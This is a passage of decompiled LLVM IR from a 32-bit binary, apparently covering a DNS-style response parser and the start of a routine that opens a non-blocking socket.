  %v4_8050066 = icmp eq i8 %v2_8050064, 0
  %v1_8050068 = icmp eq i1 %v4_8050066, false
  br i1 %v1_8050068, label %dec_label_pc_8050039, label %dec_label_pc_805006a

dec_label_pc_805006a:                             ; preds = %dec_label_pc_80500fc, %dec_label_pc_8050041, %dec_label_pc_805002a
  %v4_805008624 = phi i32 [ %v6_805003317, %dec_label_pc_805002a ], [ %v6_8050064, %dec_label_pc_8050041 ], [ %v6_8050033, %dec_label_pc_80500fc ]
  %v5_8050120 = phi i32 [ %v0_805002a, %dec_label_pc_805002a ], [ %v2_8050062, %dec_label_pc_8050041 ], [ %v1_80500fc, %dec_label_pc_80500fc ]
  %v1_805006a = phi i32 [ 0, %dec_label_pc_805002a ], [ 1, %dec_label_pc_8050041 ], [ %v0_80500fd, %dec_label_pc_80500fc ]
  %v0_805006a = phi i32 [ 1, %dec_label_pc_805002a ], [ %v0_8050100, %dec_label_pc_8050041 ], [ %v3_8050100, %dec_label_pc_80500fc ]
  %v2_805006a = add i32 %v1_805006a, %v0_805002a
  %v2_805006c = add i32 %v2_805006a, %v0_805006a
  store i32 %v2_805006c, i32* @esi, align 4
  %v1_805006f = inttoptr i32 %v2_805006c to i16*
  %v2_805006f = load i16, i16* %v1_805006f, align 2
  %v8_805006f = icmp eq i16 %v2_805006f, 256
  %v1_8050074 = add i32 %v2_805006c, 10
  store i32 %v1_8050074, i32* @edi, align 4
  br i1 %v8_805006f, label %dec_label_pc_8050114, label %dec_label_pc_805007d

dec_label_pc_805007d:                             ; preds = %dec_label_pc_8050114, %dec_label_pc_805006a
  store i32 %v1_8050074, i32* %edx.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_805008621 = inttoptr i32 %v1_8050074 to i8*
  %v2_805008622 = load i8, i8* %v1_805008621, align 1
  %v3_805008623 = zext i8 %v2_805008622 to i32
  %v5_805008625 = and i32 %v4_805008624, -256
  %v6_805008626 = or i32 %v3_805008623, %v5_805008625
  store i32 %v6_805008626, i32* %eax.global-to-local, align 4
  %v4_805008827 = icmp eq i8 %v2_805008622, 0
  br i1 %v4_805008827, label %dec_label_pc_80500b9, label %dec_label_pc_805008c.preheader.preheader

dec_label_pc_805008c.preheader.preheader:         ; preds = %dec_label_pc_805007d
  %v1_80500ad = add i32 %v0_8050022128, 32
  br label %dec_label_pc_805008c.preheader

dec_label_pc_805008c.preheader:                   ; preds = %dec_label_pc_805008c.preheader.preheader, %dec_label_pc_8050108
  %v0_805010c = phi i32 [ %v3_805010c, %dec_label_pc_8050108 ], [ 1, %dec_label_pc_805008c.preheader.preheader ]
  %v0_805010963 = phi i32 [ %v0_8050109, %dec_label_pc_8050108 ], [ 0, %dec_label_pc_805008c.preheader.preheader ]
  %v0_805009559 = phi i32 [ %v1_8050108, %dec_label_pc_8050108 ], [ %v1_8050074, %dec_label_pc_805008c.preheader.preheader ]
  %v0_805008c57 = phi i32 [ %v6_8050086, %dec_label_pc_8050108 ], [ %v6_805008626, %dec_label_pc_805008c.preheader.preheader ]
  br label %dec_label_pc_805008c

dec_label_pc_805008c:                             ; preds = %dec_label_pc_805008c.preheader, %dec_label_pc_8050090
  %v0_8050109 = phi i32 [ %v0_805010963, %dec_label_pc_805008c.preheader ], [ 1, %dec_label_pc_8050090 ]
  %v0_8050108 = phi i32 [ %v0_805009559, %dec_label_pc_805008c.preheader ], [ %v2_80500b1, %dec_label_pc_8050090 ]
  %v4_8050086 = phi i32 [ %v0_805008c57, %dec_label_pc_805008c.preheader ], [ %v6_80500b3, %dec_label_pc_8050090 ]
  %v1_805008c = trunc i32 %v4_8050086 to i8
  %tmp141 = icmp ult i8 %v1_805008c, -64
  br i1 %tmp141, label %dec_label_pc_8050108, label %dec_label_pc_8050090

dec_label_pc_8050090:                             ; preds = %dec_label_pc_805008c
  %v1_8050090 = urem i32 %v4_8050086, 256
  store i32 %v1_8050090, i32* %eax.global-to-local, align 4
  %v1_8050095 = add i32 %v0_8050108, 1
  %v2_8050095 = inttoptr i32 %v1_8050095 to i8*
  %v3_8050095 = load i8, i8* %v2_8050095, align 1
  %v4_8050095 = zext i8 %v3_8050095 to i32
  store i32 1, i32* %ecx.global-to-local, align 4
  %v2_80500a3 = mul nuw nsw i32 %v1_8050090, 256
  %v2_80500a6 = add nsw i32 %v2_80500a3, -49152
  %v3_80500a6 = or i32 %v4_8050095, %v2_80500a6
  store i32 %v3_80500a6, i32* %eax.global-to-local, align 4
  %v2_80500b1 = add i32 %v1_80500ad, %v3_80500a6
  store i32 %v2_80500b1, i32* %edx.global-to-local, align 4
  %v1_80500b3 = inttoptr i32 %v2_80500b1 to i8*
  %v2_80500b3 = load i8, i8* %v1_80500b3, align 1
  %v3_80500b3 = zext i8 %v2_80500b3 to i32
  %v6_80500b3 = or i32 %v3_80500b3, %v2_80500a6
  store i32 %v6_80500b3, i32* %eax.global-to-local, align 4
  %v4_80500b5 = icmp eq i8 %v2_80500b3, 0
  %v1_80500b7 = icmp eq i1 %v4_80500b5, false
  br i1 %v1_80500b7, label %dec_label_pc_805008c, label %dec_label_pc_80500b9

dec_label_pc_80500b9:                             ; preds = %dec_label_pc_8050108, %dec_label_pc_8050090, %dec_label_pc_805007d
  %v1_80500b9 = phi i32 [ 0, %dec_label_pc_805007d ], [ 1, %dec_label_pc_8050090 ], [ %v0_8050109, %dec_label_pc_8050108 ]
  %v0_80500b9 = phi i32 [ 1, %dec_label_pc_805007d ], [ %v0_805010c, %dec_label_pc_8050090 ], [ %v3_805010c, %dec_label_pc_8050108 ]
  %v2_80500b9 = add i32 %v0_80500b9, %v1_80500b9
  store i32 %v2_80500b9, i32* @ebx, align 4
  %v2_80500bb = add i32 %v2_80500b9, %v1_8050074
  br label %dec_label_pc_805001d.backedge

dec_label_pc_805001d.backedge:                    ; preds = %dec_label_pc_80500b9, %dec_label_pc_8050130
  %v0_805001d = phi i32 [ %v0_8050022128, %dec_label_pc_80500b9 ], [ %v0_805001d.pre, %dec_label_pc_8050130 ]
  %storemerge = phi i32 [ %v2_80500bb, %dec_label_pc_80500b9 ], [ %v2_805013b, %dec_label_pc_8050130 ]
  store i32 %storemerge, i32* %ecx.global-to-local, align 4
  %v1_805001d = add i32 %v0_805001d, 22
  %v2_805001d = inttoptr i32 %v1_805001d to i16*
  %v3_805001d = load i16, i16* %v2_805001d, align 2
  %v4_805001d = add i16 %v3_805001d, -1
  store i16 %v4_805001d, i16* %v2_805001d, align 2
  %v0_8050022 = load i32, i32* @esp, align 4
  %v1_8050022 = add i32 %v0_8050022, 22
  %v2_8050022 = inttoptr i32 %v1_8050022 to i16*
  %v3_8050022 = load i16, i16* %v2_8050022, align 2
  %v13_8050022 = icmp eq i16 %v3_8050022, -1
  br i1 %v13_8050022, label %dec_label_pc_804ffb4, label %dec_label_pc_805002a

dec_label_pc_80500c3:                             ; preds = %dec_label_pc_804ffb4
  %v1_80500c3 = add i32 %v2_804ffc0, 4
  %v2_80500c3 = inttoptr i32 %v1_80500c3 to i32*
  %v3_80500c3 = load i32, i32* %v2_80500c3, align 4
  store i32 %v3_80500c3, i32* %eax.global-to-local, align 4
  %v1_80500c6 = icmp eq i32 %v3_80500c3, 0
  br i1 %v1_80500c6, label %dec_label_pc_80500d6, label %dec_label_pc_80500ca

dec_label_pc_80500ca:                             ; preds = %dec_label_pc_80500c3
  %v3_80500cd = inttoptr i32 %v0_804ffbd to i32*
  store i32 %v3_80500c3, i32* %v3_80500cd, align 4
  %v1_80500ce = call i32 @function_8054319(i32 1)
  store i32 %v1_80500ce, i32* %eax.global-to-local, align 4
  %v0_80500d3 = load i32, i32* @esp, align 4
  %v1_80500d3 = add i32 %v0_80500d3, 16
  br label %dec_label_pc_80500d6

dec_label_pc_80500d6:                             ; preds = %dec_label_pc_80500c3, %dec_label_pc_80500ca
  %v0_80500d6 = phi i32 [ %v1_804ffbd, %dec_label_pc_80500c3 ], [ %v1_80500d3, %dec_label_pc_80500ca ]
  %v2_80500d9 = inttoptr i32 %v0_80500d6 to i32*
  %v3_80500d9 = load i32, i32* %v2_80500d9, align 4
  store i32 %v3_80500d9, i32* @esi, align 4
  %v2_80500dd = add i32 %v0_80500d6, -16
  %v3_80500dd = inttoptr i32 %v2_80500dd to i32*
  store i32 %v3_80500d9, i32* %v3_80500dd, align 4
  %v1_80500de = call i32 @function_8054319(i32 1)
  store i32 %v1_80500de, i32* %eax.global-to-local, align 4
  %v0_80500e3 = load i32, i32* @esp, align 4
  %v1_80500e3 = add i32 %v0_80500e3, 16
  %v2_80500e3 = inttoptr i32 %v1_80500e3 to i32*
  store i32 0, i32* %v2_80500e3, align 4
  %v0_80500eb = load i32, i32* @esp, align 4
  %v1_80500eb = add i32 %v0_80500eb, 16
  %v1_80500ee = inttoptr i32 %v1_80500eb to i32*
  %v2_80500ee = load i32, i32* %v1_80500ee, align 4
  store i32 %v2_80500ee, i32* %eax.global-to-local, align 4
  %v1_80500f1 = add i32 %v0_80500eb, 4300
  %v1_80500f7 = inttoptr i32 %v1_80500f1 to i32*
  %v2_80500f7 = load i32, i32* %v1_80500f7, align 4
  store i32 %v2_80500f7, i32* @ebx, align 4
  %v3_80500f8 = add i32 %v0_80500eb, 4308
  %v1_80500f9 = inttoptr i32 %v3_80500f8 to i32*
  %v2_80500f9 = load i32, i32* %v1_80500f9, align 4
  store i32 %v2_80500f9, i32* @edi, align 4
  %v3_80500f9 = add i32 %v0_80500eb, 4312
  %v1_80500fa = inttoptr i32 %v3_80500f9 to i32*
  %v2_80500fa = load i32, i32* %v1_80500fa, align 4
  store i32 %v2_80500fa, i32* @ebp, align 4
  ret i32 %v2_80500ee

dec_label_pc_80500fc:                             ; preds = %dec_label_pc_8050039
  %v1_80500fc = add i32 %v0_80500fc, 1
  store i32 %v1_80500fc, i32* %edx.global-to-local, align 4
  %v5_80500fd = icmp eq i32 %v0_80500fd, 0
  %v2_8050100 = zext i1 %v5_80500fd to i32
  %v3_8050100 = add i32 %v2_8050100, %v0_8050100
  %v1_8050033 = inttoptr i32 %v1_80500fc to i8*
  %v2_8050033 = load i8, i8* %v1_8050033, align 1
  %v3_8050033 = zext i8 %v2_8050033 to i32
  %v5_8050033 = and i32 %v4_8050033, -256
  %v6_8050033 = or i32 %v3_8050033, %v5_8050033
  store i32 %v6_8050033, i32* %eax.global-to-local, align 4
  %v4_8050035 = icmp eq i8 %v2_8050033, 0
  br i1 %v4_8050035, label %dec_label_pc_805006a, label %dec_label_pc_8050039.preheader

dec_label_pc_8050108:                             ; preds = %dec_label_pc_805008c
  %v1_8050108 = add i32 %v0_8050108, 1
  store i32 %v1_8050108, i32* %edx.global-to-local, align 4
  %v5_8050109 = icmp eq i32 %v0_8050109, 0
  %v2_805010c = zext i1 %v5_8050109 to i32
  %v3_805010c = add i32 %v2_805010c, %v0_805010c
  %v1_8050086 = inttoptr i32 %v1_8050108 to i8*
  %v2_8050086 = load i8, i8* %v1_8050086, align 1
  %v3_8050086 = zext i8 %v2_8050086 to i32
  %v5_8050086 = and i32 %v4_8050086, -256
  %v6_8050086 = or i32 %v3_8050086, %v5_8050086
  store i32 %v6_8050086, i32* %eax.global-to-local, align 4
  %v4_8050088 = icmp eq i8 %v2_8050086, 0
  br i1 %v4_8050088, label %dec_label_pc_80500b9, label %dec_label_pc_805008c.preheader

dec_label_pc_8050114:                             ; preds = %dec_label_pc_805006a
  %v1_8050114 = add i32 %v2_805006c, 2
  %v2_8050114 = inttoptr i32 %v1_8050114 to i16*
  %v3_8050114 = load i16, i16* %v2_8050114, align 2
  %v9_8050114 = icmp eq i16 %v3_8050114, 256
  %v1_805011a = icmp eq i1 %v9_8050114, false
  br i1 %v1_805011a, label %dec_label_pc_805007d, label %dec_label_pc_8050120

dec_label_pc_8050120:                             ; preds = %dec_label_pc_8050114
  %v1_8050120 = add i32 %v2_805006c, 8
  %v2_8050120 = inttoptr i32 %v1_8050120 to i16*
  %v3_8050120 = load i16, i16* %v2_8050120, align 2
  %v4_8050120 = zext i16 %v3_8050120 to i32
  %v6_8050120 = and i32 %v5_8050120, -65536
  %v7_8050120 = or i32 %v4_8050120, %v6_8050120
  store i32 %v7_8050120, i32* %edx.global-to-local, align 4
  %v2_8050126 = call i16 @llvm.bswap.i16(i16 %v3_8050120)
  %v3_8050126 = zext i16 %v2_8050126 to i32
  %v6_8050126 = or i32 %v3_8050126, %v6_8050120
  store i32 %v6_8050126, i32* %eax.global-to-local, align 4
  %v10_805012a = icmp eq i16 %v3_8050120, 1024
  br i1 %v10_805012a, label %dec_label_pc_8050143, label %dec_label_pc_8050130

dec_label_pc_8050130:                             ; preds = %dec_label_pc_8050120, %dec_label_pc_8050143
  %v0_805001d.pre = phi i32 [ %v0_8050022128, %dec_label_pc_8050120 ], [ %v0_805001d.pre.pre, %dec_label_pc_8050143 ]
  %v0_805013b = phi i32 [ %v1_8050074, %dec_label_pc_8050120 ], [ %v0_805013b.pre, %dec_label_pc_8050143 ]
  %v0_8050130 = phi i32 [ %v7_8050120, %dec_label_pc_8050120 ], [ %v7_80501a7, %dec_label_pc_8050143 ]
  %v1_8050130 = trunc i32 %v0_8050130 to i16
  %v2_8050130 = call i16 @llvm.bswap.i16(i16 %v1_8050130)
  %v3_8050130 = zext i16 %v2_8050130 to i32
  %v5_8050130 = and i32 %v0_8050130, -65536
  %v6_8050130 = or i32 %v3_8050130, %v5_8050130
  store i32 %v6_8050130, i32* %edx.global-to-local, align 4
  store i32 %v3_8050130, i32* %eax.global-to-local, align 4
  %v2_805013b = add i32 %v3_8050130, %v0_805013b
  br label %dec_label_pc_805001d.backedge

dec_label_pc_8050143:                             ; preds = %dec_label_pc_8050120
  %v2_8050143 = inttoptr i32 %v1_8050074 to i8*
  %v3_8050143 = load i8, i8* %v2_8050143, align 1
  %v4_8050143 = zext i8 %v3_8050143 to i32
  %v6_8050143 = and i32 %v6_8050126, -256
  %v7_8050143 = or i32 %v4_8050143, %v6_8050143
  store i32 %v7_8050143, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v3_8050148 = add i32 %v0_8050022128, 4280
  %v4_8050148 = inttoptr i32 %v3_8050148 to i8*
  store i8 %v3_8050143, i8* %v4_8050148, align 1
  %v0_805014f = load i32, i32* @edi, align 4
  %v1_805014f = add i32 %v0_805014f, 1
  %v2_805014f = inttoptr i32 %v1_805014f to i8*
  %v3_805014f = load i8, i8* %v2_805014f, align 1
  %v4_805014f = zext i8 %v3_805014f to i32
  %v5_805014f = load i32, i32* %eax.global-to-local, align 4
  %v6_805014f = and i32 %v5_805014f, -256
  %v7_805014f = or i32 %v6_805014f, %v4_805014f
  store i32 %v7_805014f, i32* %eax.global-to-local, align 4
  %v2_8050152 = load i32, i32* @esp, align 4
  %v3_8050152 = add i32 %v2_8050152, 4281
  %v4_8050152 = inttoptr i32 %v3_8050152 to i8*
  store i8 %v3_805014f, i8* %v4_8050152, align 1
  %v0_8050159 = load i32, i32* @edi, align 4
  %v1_8050159 = add i32 %v0_8050159, 2
  %v2_8050159 = inttoptr i32 %v1_8050159 to i8*
  %v3_8050159 = load i8, i8* %v2_8050159, align 1
  %v4_8050159 = zext i8 %v3_8050159 to i32
  %v5_8050159 = load i32, i32* %eax.global-to-local, align 4
  %v6_8050159 = and i32 %v5_8050159, -256
  %v7_8050159 = or i32 %v6_8050159, %v4_8050159
  store i32 %v7_8050159, i32* %eax.global-to-local, align 4
  %v2_805015c = load i32, i32* @esp, align 4
  %v3_805015c = add i32 %v2_805015c, 4282
  %v4_805015c = inttoptr i32 %v3_805015c to i8*
  store i8 %v3_8050159, i8* %v4_805015c, align 1
  %v0_8050163 = load i32, i32* @edi, align 4
  %v1_8050163 = add i32 %v0_8050163, 3
  %v2_8050163 = inttoptr i32 %v1_8050163 to i8*
  %v3_8050163 = load i8, i8* %v2_8050163, align 1
  %v4_8050163 = zext i8 %v3_8050163 to i32
  %v5_8050163 = load i32, i32* %eax.global-to-local, align 4
  %v6_8050163 = and i32 %v5_8050163, -256
  %v7_8050163 = or i32 %v6_8050163, %v4_8050163
  store i32 %v7_8050163, i32* %eax.global-to-local, align 4
  %v2_8050166 = load i32, i32* @esp, align 4
  %v3_8050166 = add i32 %v2_8050166, 4283
  %v4_8050166 = inttoptr i32 %v3_8050166 to i8*
  store i8 %v3_8050163, i8* %v4_8050166, align 1
  %v0_805016d = load i32, i32* %eax.global-to-local, align 4
  %v1_805016d = load i32, i32* @esp, align 4
  %v2_805016d = add i32 %v1_805016d, -4
  %v3_805016d = inttoptr i32 %v2_805016d to i32*
  store i32 %v0_805016d, i32* %v3_805016d, align 4
  %v0_805016e = load i32, i32* %eax.global-to-local, align 4
  %v2_805016e = add i32 %v1_805016d, -8
  %v3_805016e = inttoptr i32 %v2_805016e to i32*
  store i32 %v0_805016e, i32* %v3_805016e, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8050171 = inttoptr i32 %v1_805016d to i32*
  %v3_8050171 = load i32, i32* %v2_8050171, align 4
  store i32 %v3_8050171, i32* @edx, align 4
  %v1_8050175 = inttoptr i32 %v3_8050171 to i8*
  %v2_8050175 = load i8, i8* %v1_8050175, align 1
  %v3_8050175 = zext i8 %v2_8050175 to i32
  %v1_8050177 = mul nuw nsw i32 %v3_8050175, 4
  %v2_8050177 = add nuw nsw i32 %v1_8050177, 4
  store i32 %v2_8050177, i32* %eax.global-to-local, align 4
  %v2_805017e = add i32 %v1_805016d, -12
  %v3_805017e = inttoptr i32 %v2_805017e to i32*
  store i32 %v2_8050177, i32* %v3_805017e, align 4
  %v0_805017f = load i32, i32* @edx, align 4
  %v1_805017f = add i32 %v0_805017f, 4
  %v2_805017f = inttoptr i32 %v1_805017f to i32*
  %v3_805017f = load i32, i32* %v2_805017f, align 4
  store i32 %v3_805017f, i32* %eax.global-to-local, align 4
  %v2_8050182 = add i32 %v1_805016d, -16
  %v3_8050182 = inttoptr i32 %v2_8050182 to i32*
  store i32 %v3_805017f, i32* %v3_8050182, align 4
  %v0_8050183 = call i32 @function_8053dbc()
  store i32 %v0_8050183, i32* %eax.global-to-local, align 4
  %v0_8050188 = load i32, i32* @esp, align 4
  %v1_8050188 = add i32 %v0_8050188, 16
  %v2_8050188 = inttoptr i32 %v1_8050188 to i32*
  %v3_8050188 = load i32, i32* %v2_8050188, align 4
  store i32 %v3_8050188, i32* %ecx.global-to-local, align 4
  %v1_805018c = inttoptr i32 %v3_8050188 to i8*
  %v2_805018c = load i8, i8* %v1_805018c, align 1
  %v3_805018c = zext i8 %v2_805018c to i32
  %v4_805018c = load i32, i32* @edx, align 4
  %v5_805018c = and i32 %v4_805018c, -256
  %v6_805018c = or i32 %v5_805018c, %v3_805018c
  store i32 %v6_805018c, i32* %edx.global-to-local, align 4
  %v2_805018e = add i32 %v3_8050188, 4
  %v3_805018e = inttoptr i32 %v2_805018e to i32*
  store i32 %v0_8050183, i32* %v3_805018e, align 4
  %v0_8050191 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050191 = urem i32 %v0_8050191, 256
  %v2_8050191 = load i32, i32* @ebx, align 4
  %v3_8050191 = and i32 %v2_8050191, -256
  %v4_8050191 = or i32 %v3_8050191, %v1_8050191
  store i32 %v4_8050191, i32* @ebx, align 4
  %v0_8050193 = load i32, i32* @esp, align 4
  %v1_8050193 = add i32 %v0_8050193, 4296
  %v2_8050193 = inttoptr i32 %v1_8050193 to i32*
  %v3_8050193 = load i32, i32* %v2_8050193, align 4
  store i32 %v3_8050193, i32* %ecx.global-to-local, align 4
  %v1_805019a = add i32 %v0_8050191, 1
  store i32 %v1_805019a, i32* %edx.global-to-local, align 4
  %v3_805019b = mul i32 %v4_8050191, 4
  %v4_805019b = add i32 %v3_805019b, %v0_8050183
  %v5_805019b = inttoptr i32 %v4_805019b to i32*
  store i32 %v3_8050193, i32* %v5_805019b, align 4
  %v0_805019e = load i32, i32* @esp, align 4
  %v1_805019e = add i32 %v0_805019e, 16
  %v2_805019e = inttoptr i32 %v1_805019e to i32*
  %v3_805019e = load i32, i32* %v2_805019e, align 4
  store i32 %v3_805019e, i32* %eax.global-to-local, align 4
  %v0_80501a5 = load i32, i32* %edx.global-to-local, align 4
  %v1_80501a5 = trunc i32 %v0_80501a5 to i8
  %v3_80501a5 = inttoptr i32 %v3_805019e to i8*
  store i8 %v1_80501a5, i8* %v3_80501a5, align 1
  %v0_80501a7 = load i32, i32* @esi, align 4
  %v1_80501a7 = add i32 %v0_80501a7, 8
  %v2_80501a7 = inttoptr i32 %v1_80501a7 to i16*
  %v3_80501a7 = load i16, i16* %v2_80501a7, align 2
  %v4_80501a7 = zext i16 %v3_80501a7 to i32
  %v5_80501a7 = load i32, i32* %edx.global-to-local, align 4
  %v6_80501a7 = and i32 %v5_80501a7, -65536
  %v7_80501a7 = or i32 %v6_80501a7, %v4_80501a7
  store i32 %v7_80501a7, i32* %edx.global-to-local, align 4
  %v0_805013b.pre = load i32, i32* @edi, align 4
  %v0_805001d.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050130

; uselistorder directives
  uselistorder i32 %v7_80501a7, { 1, 0 }
  uselistorder i32 %v0_8050191, { 1, 0 }
  uselistorder i32 %v3_8050130, { 0, 2, 1 }
  uselistorder i32 %v0_8050130, { 1, 0 }
  uselistorder i32 %v6_8050086, { 1, 0 }
  uselistorder i32 %v3_805010c, { 1, 0 }
  uselistorder i32 %v1_8050108, { 1, 2, 0 }
  uselistorder i32 %v6_8050033, { 2, 1, 0 }
  uselistorder i32 %v3_8050100, { 1, 0 }
  uselistorder i32 %v1_80500fc, { 2, 3, 1, 0 }
  uselistorder i32 %v0_80500d6, { 1, 0 }
  uselistorder i32 %v0_8050022, { 2, 1, 0 }
  uselistorder i32 %v6_80500b3, { 1, 0 }
  uselistorder i32 %v2_80500b1, { 1, 2, 0 }
  uselistorder i32 %v3_80500a6, { 1, 0 }
  uselistorder i32 %v4_8050086, { 1, 0, 2 }
  uselistorder i32 %v0_8050109, { 2, 0, 1 }
  uselistorder i32 %v0_805010c, { 1, 0 }
  uselistorder i32 %v1_8050074, { 5, 4, 1, 0, 2, 3, 6 }
  uselistorder i32 %v6_8050064, { 0, 2, 1 }
  uselistorder i32 %v2_8050062, { 0, 2, 3, 1 }
  uselistorder i32 %v3_8050057, { 1, 0 }
  uselistorder i32 %v4_8050033, { 1, 0, 2 }
  uselistorder i32 %v0_80500fd, { 2, 0, 1 }
  uselistorder i32 %v0_8050100, { 1, 0 }
  uselistorder i32 %v6_805003317, { 1, 0, 2 }
  uselistorder i32 %v0_805002a, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_8050022128, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_8050022123, { 0, 2, 1 }
  uselistorder i32 %v1_804fff3, { 1, 0 }
  uselistorder i32 %v0_804ffef, { 0, 1, 2, 4, 5, 3 }
  uselistorder i32 %v2_804ffea, { 1, 0, 2 }
  uselistorder i32 %v0_804ffbd, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_804ff7e, { 1, 0 }
  uselistorder i32 %v0_804ff2f, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 %v0_804ff2a, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804fef7, { 1, 0 }
  uselistorder i32 %v2_804fef4, { 1, 0 }
  uselistorder i32 %v0_804fef0, { 1, 0 }
  uselistorder i32 %v1_804fedd, { 2, 0, 1, 3 }
  uselistorder i32 %v12_804fed1, { 1, 0 }
  uselistorder i32 %v0_804fece, { 2, 0, 1 }
  uselistorder i32 %v0_804feb9, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_804fe97, { 0, 6, 1, 2, 3, 4, 5 }
  uselistorder i32 %v0_804fe78, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v3_804fe73, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804fe58, { 1, 0 }
  uselistorder i32 %v2_804fddf, { 1, 0 }
  uselistorder i32 %v1_804fdd1, { 1, 0 }
  uselistorder i32 %v1_804fd73, { 1, 0 }
  uselistorder i8 %v2_804fd62, { 2, 0, 3, 1 }
  uselistorder i32 %v0_804fd5c, { 0, 2, 3, 1 }
  uselistorder i32 %v2_804fd30, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21 }
  uselistorder i32* %ecx.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 25, 29, 18, 19, 20, 21, 22, 23, 24, 1, 26, 27, 28, 0, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i16 -1, { 2, 3, 0, 1 }
  uselistorder i32 4312, { 1, 0 }
  uselistorder i32 4308, { 1, 0 }
  uselistorder i32 4300, { 1, 0 }
  uselistorder i32 (i32)* @function_8054770, { 6, 5, 1, 4, 3, 2, 0 }
  uselistorder i32 (i8*)* @function_8052620, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 23, 24, 25, 26, 27, 21, 22, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 73, 39, 40, 67, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 68, 69, 0, 70, 71, 72 }
  uselistorder label %dec_label_pc_8050130, { 1, 0 }
  uselistorder label %dec_label_pc_80500d6, { 1, 0 }
  uselistorder label %dec_label_pc_805001d.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_805008c, { 1, 0 }
  uselistorder label %dec_label_pc_805008c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8050039, { 1, 0 }
  uselistorder label %dec_label_pc_8050039.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805002a, { 1, 0 }
  uselistorder label %dec_label_pc_804ffb4, { 5, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804fe6c, { 1, 0 }
  uselistorder label %dec_label_pc_804fd62, { 1, 0 }
}

define i32 @function_80501d0() local_unnamed_addr {
dec_label_pc_80501d0:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_80501d0 = load i32, i32* @ebx, align 4
  %v0_80501d1 = load i32, i32* @eax, align 4
  store i32 %v0_80501d1, i32* @ebx, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_80501f6 = add i32 %v0_80501d1, 4
  %v2_80501f6 = inttoptr i32 %v1_80501f6 to i32*
  %v3_80501f6 = load i32, i32* %v2_80501f6, align 4
  %v10_80501f9 = icmp eq i32 %v3_80501f6, -1
  br i1 %v10_80501f9, label %dec_label_pc_80501d0.dec_label_pc_805020a_crit_edge, label %dec_label_pc_80501fe

dec_label_pc_80501d0.dec_label_pc_805020a_crit_edge: ; preds = %dec_label_pc_80501d0
  br label %dec_label_pc_805020a

dec_label_pc_80501fe:                             ; preds = %dec_label_pc_80501d0
  %v1_8050202 = call i32 @function_8052bc1(i32 %v3_80501f6)
  br label %dec_label_pc_805020a

dec_label_pc_805020a:                             ; preds = %dec_label_pc_80501d0.dec_label_pc_805020a_crit_edge, %dec_label_pc_80501fe
  %v3_8050211 = call i32 @function_80533b5(i32 2, i32 1, i32 0)
  %v1_8050219 = load i32, i32* @ebx, align 4
  %v2_8050219 = add i32 %v1_8050219, 4
  %v3_8050219 = inttoptr i32 %v2_8050219 to i32*
  store i32 %v3_8050211, i32* %v3_8050219, align 4
  %v8_805021c = icmp eq i32 %v3_8050211, -1
  br i1 %v8_805021c, label %dec_label_pc_805020a.dec_label_pc_8050293_crit_edge, label %dec_label_pc_805021f

dec_label_pc_805020a.dec_label_pc_8050293_crit_edge: ; preds = %dec_label_pc_805020a
  br label %dec_label_pc_8050293

dec_label_pc_805021f:                             ; preds = %dec_label_pc_805020a
  %v0_8050221 = load i32, i32* @ebx, align 4
  %v1_8050221 = add i32 %v0_8050221, 28
  store i32 %v1_8050221, i32* @eax, align 4
  %v1_8050229 = add i32 %v0_8050221, 24
  %v2_8050229 = inttoptr i32 %v1_8050229 to i32*
  store i32 0, i32* %v2_8050229, align 4
  %v0_8050230 = load i32, i32* @eax, align 4
  %v2_8050231 = call i32 @function_80526b0(i32 %v0_8050230, i32 256)
  %v0_8050239 = load i32, i32* @ebx, align 4
  %v1_8050239 = add i32 %v0_8050239, 4
  %v2_8050239 = inttoptr i32 %v1_8050239 to i32*
  %v3_8050239 = load i32, i32* %v2_8050239, align 4
  %v3_8050241 = call i32 @function_8052afd(i32 %v3_8050239, i32 3, i32 0)
  %v0_8050249 = load i32, i32* @ebx, align 4
  %v1_8050249 = add i32 %v0_8050249, 4
  %v2_8050249 = inttoptr i32 %v1_8050249 to i32*
  %v3_8050249 = load i32, i32* %v2_8050249, align 4
  %v12_805024c = or i32 %v3_8050241, 2048
  %v3_8050253 = call i32 @function_8052afd(i32 %v3_8050249, i32 4, i32 %v12_805024c)
  %v0_8050258 = load i32, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-20, align 4
  %v0_805026e = load i32, i32* @global_var_80572f0.34, align 16
  %v2_8050273 = add i32 %v0_8050258, 8
  %v3_8050273 = inttoptr i32 %v2_8050273 to i32*
